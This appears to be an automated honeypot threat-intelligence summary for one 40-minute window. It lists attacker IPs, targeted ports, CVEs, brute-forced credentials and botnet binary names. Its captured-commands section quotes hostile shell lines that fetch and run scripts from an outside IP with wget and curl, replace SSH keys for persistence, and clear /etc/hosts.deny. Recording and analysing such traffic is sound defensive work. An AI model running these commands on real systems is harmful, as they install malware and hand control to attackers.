# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-04T18:01:28Z
**Timeframe:** 2025-10-04T17:20:02Z to 2025-10-04T18:00:02Z

**Files Used:**
- agg_log_20251004T172002Z.json
- agg_log_20251004T174001Z.json
- agg_log_20251004T180002Z.json

## Executive Summary
This report summarizes 9,574 events collected from the honeypot network. The majority of attacks were captured by the Cowrie honeypot, with significant activity also detected on Dionaea and Ciscoasa. Attackers primarily targeted SMB (port 445) and SSH (port 22) services. A variety of CVEs were targeted, and attackers attempted to run numerous commands, including efforts to add SSH keys for persistent access.

## Detailed Analysis

### Attacks by Honeypot
- **Cowrie:** 4608
- **Ciscoasa:** 1560
- **Dionaea:** 1213
- **Suricata:** 844
- **Mailoney:** 836
- **Honeytrap:** 115
- **Sentrypeer:** 82
- **Adbhoney:** 76
- **H0neytr4p:** 64
- **Tanner:** 51
- **Miniprint:** 48
- **Redishoneypot:** 40
- **ConPot:** 20
- **Honeyaml:** 12
- **ElasticPot:** 3
- **Ipphoney:** 2

### Top Attacking IPs
- 15.235.131.242
- 176.65.141.117
- 118.194.230.231
- 128.199.111.31
- 91.108.145.16
- 39.109.116.40
- 45.64.112.160
- 43.155.21.198
- 181.47.93.59
- 94.102.4.12
- 165.154.205.128
- 191.242.105.131
- 36.137.99.125
- 116.255.159.152
- 150.5.129.10
- 60.190.239.92
- 102.88.137.80
- 109.230.196.142
- 14.103.115.85
- 178.128.124.111

### Top Targeted Ports/Protocols
- 445
- 25
- 22
- 5060
- 443
- 80
- 9100
- 6379
- 2404
- TCP/5432
- 23
- TCP/8080
- TCP/1433
- 5555
- TCP/3389

### Most Common CVEs
- CVE-2019-11500
- CVE-2021-3449
- CVE-2002-0013
- CVE-2002-0012
- CVE-2021-35394
- CVE-1999-0517
- CVE-2023-26801
- CVE-2006-3602
- CVE-2006-4458
- CVE-2006-4542

### Commands Attempted by Attackers
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."`
- `cat /proc/cpuinfo | grep name | wc -l`
- `uname -a`
- `whoami`
- `w`
- `crontab -l`
- `top`
- `uname`
- `Enter new UNIX password:`
- `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
- `cd /data/local/tmp/; busybox wget http://185.237.253.28/w.sh; sh w.sh; curl http://185.237.253.28/c.sh; sh c.sh; ...`

### Signatures Triggered
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET INFO Reserved Internal IP Traffic
- ET CINS Active Threat Intelligence Poor Reputation IP group 51
- ET CINS Active Threat Intelligence Poor Reputation IP group 47
- ET CINS Active Threat Intelligence Poor Reputation IP group 46
- ET CINS Active Threat Intelligence Poor Reputation IP group 43
- ET DROP Spamhaus DROP Listed Traffic Inbound group 41
- ET SCAN Potential SSH Scan
- GPL INFO SOCKS Proxy attempt

### Users / Login Attempts
- 345gs5662d34/345gs5662d34
- root/3245gs5662d34
- test/zhbjETuyMffoL8F
- novinhost/novinhost.org
- root/nPSpP4PBW0
- root/LeitboGi0ro
- root/mima
- admin/asdf123
- root/2glehe5t24th1issZs
- root/Dilawar@123
- user/12345
- root/ChangeMe

### Files Uploaded/Downloaded
- wget.sh;
- UnHAnaAW.mpsl;
- w.sh;
- c.sh;
- UnHAnaAW.arm;
- UnHAnaAW.arm5;
- UnHAnaAW.arm6;
- UnHAnaAW.arm7;
- UnHAnaAW.m68k;
- UnHAnaAW.mips;
- UnHAnaAW.ppc;
- UnHAnaAW.sh4;
- UnHAnaAW.spc;
- UnHAnaAW.x86;
- boatnet.mpsl;

### HTTP User-Agents
- No user agents were recorded in this period.

### SSH Clients and Servers
- No specific SSH clients or servers were identified in this period.

### Top Attacker AS Organizations
- No attacker AS organizations were recorded in this period.

## Key Observations and Anomalies
- A significant number of commands are focused on establishing persistent SSH access by adding a public key to `authorized_keys`.
- Attackers are using `wget` and `curl` to download and execute scripts from external sources, indicating attempts to install malware or establish botnet clients.
- The targeting of a wide range of ports suggests broad, opportunistic scanning by attackers.
- The presence of commands like `pkill -9 sleep` and clearing of `/etc/hosts.deny` suggest more sophisticated attempts to disable security measures and maintain control of compromised systems.
